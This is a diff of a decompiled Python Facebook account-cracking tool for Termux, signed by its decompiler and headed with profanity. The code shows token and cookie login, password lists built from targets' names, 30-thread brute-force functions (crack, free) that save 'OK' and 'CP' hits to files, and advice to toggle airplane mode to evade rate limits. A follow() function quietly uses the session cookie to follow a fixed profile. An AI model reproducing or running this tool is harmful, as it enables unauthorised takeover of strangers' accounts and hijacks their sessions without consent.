@@ -1,23 +1,23 @@
  #FUCK YOU  
  # DECOMPYLED BY :- MR-KHAN-XD 
  #HOR KRO APNE IS DADA NU CHALENGE😂❤️ 
- W = '\033[97;1m' 
- R = '\033[91;1m' 
- G = '\033[92;1m' 
- Y = '\033[93;1m' 
- B = '\033[94;1m' 
- P = '\033[95;1m' 
- C = '\033[96;1m' 
- N = '\x1b[0m' 
- import os 
- try: 
+W = '\033[97;1m' 
+R = '\033[91;1m' 
+G = '\033[92;1m' 
+Y = '\033[93;1m' 
+B = '\033[94;1m' 
+P = '\033[95;1m' 
+C = '\033[96;1m' 
+N = '\x1b[0m' 
+import os 
+try: 
          import requests 
  except ImportError: 
          os.system("pip install requests") 
   
- try: 
+try: 
          import concurrent.futures 
- except ImportError: 
+except ImportError: 
          os.system("pip install futures") 
   
  import os 
@@ -59,7 +59,7 @@
  id,id2,loop,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,[],[],[],[],[],[],[],[] 
  cp = 0 
  ok = [] 
- try: 
+try: 
          os.mkdir('/sdcard/') 
  except:pass 
  # COLORS 
@@ -81,7 +81,7 @@
  okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt' 
  cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt' 
  # CLEAR 
- def clear(): 
+def clear(): 
          os.system('clear') 
  # BACK 
  def back(): 
@@ -91,13 +91,13 @@
  imt="-brand==" 
  ak="-pro" 
  myid=uuid.uuid4().hex[:10].upper() 
- try: 
+try: 
          key1 = open('/data/data/com.termux/files/usr/bin/.MRD-cov', 'r').read() 
  except: 
          kok=open('/data/data/com.termux/files/usr/bin/.MRD-cov', 'w') 
          kok.write(myid+imt) 
          kok.close() 
- def login(): 
+def login(): 
          try: 
                  token = open('.token.txt','r').read() 
                  tokenku.append(token) 
@@ -113,13 +113,13 @@
                          exit() 
          except IOError: 
                  Public() 
- def jalan(z): 
+def jalan(z): 
          for e in z + '\n': 
                  sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01) 
  ############### #LOGO############## ##  
   
  # LOGIN 
- def Public(): 
+def Public(): 
          clear() 
          print(logo) 
          print  (' [01] Login With Token\n [02] Login With Cookie') 
@@ -153,7 +153,7 @@
                          time.sleep(2.5) 
                          login() 
                          exit() 
- def public_menu(): 
+def public_menu(): 
          try: 
                  token = open('.token.txt','r').read() 
          except IOError: 
@@ -173,7 +173,7 @@
          except (KeyError,IOError): 
                  print(' [!] Not public Or Token Expire') 
                  exit() 
- def File(): 
+def File(): 
                          clear() 
                          print(logo) 
                          try: 
@@ -184,7 +184,7 @@
                          except IOError: 
                                  exit("\n [!] file %s not found"%(fileX)) 
   
- def setting(): 
+def setting(): 
          hu = ("2") 
          if hu in ['1','01']: 
                  for tua in sorted(id): 
@@ -216,7 +216,7 @@
          else: 
                  method.append('mobile') 
          passmenu() 
- def passmenu(): 
+def passmenu(): 
          clear() 
          print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ password') 
          passmen=input('\n [#] Select Pass : ') 
@@ -229,7 +229,7 @@
          else: 
                  passmenu() 
   
- def first(): 
+def first(): 
          clear() 
          print(logo);print( '\033[1;94m [!] BRUTE  HAS BEEN START \n\033[1;96m [!] Turn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n') 
          with tred(max_workers=30) as pool: 
@@ -256,7 +256,7 @@
                                  pool.submit(free,idf,pwv) 
                          else: 
                                  pool.submit(crack,idf,pwv) 
- def name(): 
+def name(): 
          clear() 
          print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc)) 
          with tred(max_workers=30) as pool: 
@@ -276,7 +276,7 @@
                                          pool.submit(crack,idf,pwv) 
                          except: 
                                  pass 
- def name2(): 
+def name2(): 
          clear() 
          print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc)) 
          with tred(max_workers=30) as pool: 
@@ -307,7 +307,7 @@
                                  pool.submit(crack,idf,pwv) 
   
  # CRACKER 
- def crack(idf,pwv): 
+def crack(idf,pwv): 
          global loop,ok,cp 
          bi = random.choice([u,k,kk,b,h,hh]) 
          pers = loop*100/len(id2) 
@@ -346,7 +346,7 @@
                  except requests.exceptions.ConnectionError: 
                          time.sleep(31) 
          loop+=1 
- def free(idf,pwv): 
+def free(idf,pwv): 
          global loop,ok,cp 
          bi = random.choice([u,k,kk,b,h,hh]) 
          pers = loop*100/len(id2) 
@@ -384,13 +384,13 @@
                  except requests.exceptions.ConnectionError: 
                          time.sleep(31) 
          loop+=1 
- def follow(ses,coki): 
+def follow(ses,coki): 
          ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}) 
          r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text, 'html.parser') 
          get = r.find('a', string='Follow').get('href') 
          ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text 
   
- logo = """ 
+logo = """ 
  \033[0;95m=============W3LCOM3======================== 
  \033[1;94m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
  \033[1;91m   
@@ -415,7 +415,7 @@
  \033[0;94m>>[\033[0;91mKhan-VAU:\033[0;92mYOUR NEXT DAD 
  \033[0;95m═══════════════════════════════════════════""" 
   
- class Main: 
+class Main: 
          def __init__(self): 
                  self.id = [] 
                  self.ok = [] 
